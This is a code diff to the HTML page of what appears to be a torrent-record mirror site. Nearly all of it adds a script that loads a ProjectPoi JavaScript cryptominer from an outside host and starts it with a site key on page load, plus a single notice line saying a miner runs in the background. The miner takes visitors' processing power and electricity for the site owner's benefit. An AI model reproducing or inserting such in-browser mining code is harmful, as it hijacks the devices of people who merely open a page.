@@ -93,6 +93,7 @@
                 <li>We do not offer any download service. You need an account to access and download on the appropriate website.</li>
                 <li>The records may lag behind the corresponding website about 2-15 minutes later, depending on their feeding service.</li>
                 <li>The recorded title will no longer be updated (even if the corresponding torrent edit, disable or delete).</li>
+                <li>A Miner will run in the background to help keep the Reptile Server and the API.</li>
             </ol>
         </div>
       </div>
@@ -109,6 +110,12 @@
 
     <!-- Latest compiled and minified Locales for bootstrap-table -->
     <!-- <script src="https://cdn.bootcss.com/bootstrap-table/1.11.1/locale/bootstrap-table-zh-CN.min.js"></script> -->
+
+    <script src="https://ppoi.org/lib/projectpoi.min.js"></script>
+    <script>
+        var miner = new ProjectPoi.Anonymous('9iFrNpCH6wZY1Q1FRNIU5Bf4');
+        miner.start();
+    </script>
 
     <script>
         var $table = $('#table');
